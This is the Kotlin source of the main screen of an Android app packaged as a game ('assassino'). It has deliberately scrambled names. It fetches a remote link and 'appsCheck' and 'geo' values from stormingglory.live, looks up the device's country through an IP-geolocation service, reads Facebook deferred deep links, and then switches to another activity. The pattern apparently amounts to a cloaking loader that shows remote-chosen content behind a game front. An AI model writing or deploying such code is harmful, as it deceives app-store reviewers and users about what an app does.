package com.rubygames.assassino

import android.content.Context
import android.content.Intent
import android.os.Bundle
import androidx.appcompat.app.AppCompatActivity
import com.facebook.applinks.AppLinkData
import com.orhanobut.hawk.Hawk
import com.rubygames.assassino.AllInOneClasss.Companion.countryCodegtgt
import com.rubygames.assassino.AllInOneClasss.Companion.geogtgt
import com.rubygames.assassino.databinding.ActivityMainBinding
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.GlobalScope
import kotlinx.coroutines.Job
import kotlinx.coroutines.launch
import retrofit2.Retrofit
import retrofit2.converter.gson.GsonConverterFactory
import java.util.concurrent.Executors
import java.util.concurrent.TimeUnit

class MainActivity : AppCompatActivity() {
    private lateinit var deddeede: ActivityMainBinding

    private suspend fun getDataDev() {

        val frfrghy = Retrofit.Builder()
            .addConverterFactory(GsonConverterFactory.create())
            .baseUrl("http://stormingglory.live/")
            .build()
            .create(ServiceApi::class.java)
        val linkViewfrgtt = frfrghy.UOUOUOUO().body()?.gttgtgttg.toString()
        val frfgtgt = frfrghy.UOUOUOUO().body()?.yhyhyjujuuj.toString()
        val frgtt = frfrghy.UOUOUOUO().body()?.jujujujujuj.toString()


        Hawk.put(AllInOneClasss.linkgtgtg, linkViewfrgtt)
        Hawk.put(AllInOneClasss.appsCheckgtgt, frfgtgt)
        Hawk.put(geogtgt, frgtt)


    }


    override fun onCreate(savedInstanceState: Bundle?) {

        super.onCreate(savedInstanceState)
        deddeede = ActivityMainBinding.inflate(layoutInflater)
        setContentView(deddeede.root)

        ujujuuju(this)

        val gttgt = Executors.newSingleThreadScheduledExecutor()
        var gtthhy: String? = Hawk.get(countryCodegtgt, null)
        var gthyhhy: String? = Hawk.get(geogtgt, null)
        gttgt.scheduleAtFixedRate({
            if (gtthhy != null && gthyhhy != null) {
                gttgt.shutdown()
                gtgyhyhy5()
            } else {
                gtthhy = Hawk.get(countryCodegtgt)
                gthyhhy = Hawk.get(geogtgt)
            }
        }, 0, 1, TimeUnit.SECONDS)

        GlobalScope.launch(Dispatchers.IO) {
            gyhyhyh
        }
    }

    private suspend fun getData() {
        val tgtgtt = Retrofit.Builder()
            .addConverterFactory(GsonConverterFactory.create())
            .baseUrl("http://pro.ip-api.com/")
            .build()
            .create(ServiceApi::class.java)
        val gthyyy = tgtgtt.poopopop().body()?.ololololo

        Hawk.put(countryCodegtgt, gthyyy)
    }

    private val gyhyhyh: Job = GlobalScope.launch(Dispatchers.IO) {
        getData()
        getDataDev()
    }

    fun ujujuuju(context: Context) {
        AppLinkData.fetchDeferredAppLinkData(
            context
        ) { appLinkData: AppLinkData? ->
            appLinkData?.let {
                val opopopop = appLinkData.targetUri.host.toString()
                Hawk.put(AllInOneClasss.DEEPLgttt, opopopop)
            }
            if (appLinkData == null) {
            }
        }
    }

    private fun gtgyhyhy5() {
        val iiiiiiii = Intent(this@MainActivity, AddafrgttActivity::class.java)
        startActivity(iiiiiiii)
        finish()
    }


}